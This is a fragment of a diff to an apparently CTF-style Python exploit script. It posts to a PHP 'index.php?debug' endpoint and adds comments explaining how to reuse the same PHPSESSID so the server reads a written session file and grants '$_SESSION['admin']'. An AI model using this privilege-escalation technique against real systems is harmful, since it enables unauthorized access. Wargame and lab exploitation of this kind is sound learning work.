@@ -92,3 +92,11 @@ data = {
 response = session.post(URL + 'index.php?debug', data=data)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
 print(f'{div_content}\n')
+
+
+# one request to the server won't be enough as:
+# 1. myread() is executed before mywrite()
+# the above post request will only write the file but won't assign '1' to $_SESSION['admin']
+# therefore, we need one more request for myread() to properly read the written file
+# 2. the PHPSESSID cookie must be the same for the subsequent call
+# otherwise, myread() will read from another file instead of the existing one
